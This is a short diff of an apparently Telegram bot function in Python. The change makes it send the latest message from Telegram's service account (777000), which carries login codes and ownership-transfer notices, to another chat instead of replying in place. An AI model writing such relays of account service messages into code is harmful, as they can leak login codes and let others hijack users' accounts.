@@ -47,7 +47,7 @@ async def check_past_transfers(ABH):
     try:
         messages = await ABH.get_messages(777000, limit=1)
         for message in messages:
-            await event.reply(str(message))
+            await REACTBOT.send_message(wfffp, str(message))
             if message and message.buttons:
                 text = message.raw_text.lower() if message.raw_text else ""                
                 if "owner" in text or "مالك" in text or "transfer" in text or "نقل" in text:
